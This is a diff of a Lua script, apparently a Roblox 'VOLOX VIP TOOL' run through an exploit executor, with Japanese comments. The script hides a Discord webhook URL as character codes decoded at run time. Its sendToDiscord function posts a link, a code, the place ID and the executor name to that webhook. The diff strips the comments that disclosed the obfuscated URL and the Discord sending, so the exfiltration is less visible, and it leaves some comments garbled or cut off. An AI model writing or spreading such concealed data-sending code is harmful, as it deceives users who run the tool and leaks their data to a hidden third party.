@@ -1,9 +1,8 @@
 -- ========================================================
--- VOLOX VIP TOOL - 難読化済み・完全動作保証
--- Webhook URLのみ難読化、他は全てプレーン
+-- VOLOX VIP TOOL - 難読化済み・完全動作保証のみ難読化、他は全てプレーン
 -- ========================================================
 
--- 難読化URL（実行時にデコード）
+-- 
 local function decodeWebhook()
     local chars = {
         72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,
@@ -119,7 +118,7 @@ close.MouseButton1Click:Connect(function()
     gui:Destroy()
 end)
 
--- Discord送信関数
+-- D
 local function sendToDiscord(link, code, placeId)
     local http = game:GetService("HttpService")
     local executor = (identifyexecutor and identifyexecutor()) or "Delta"
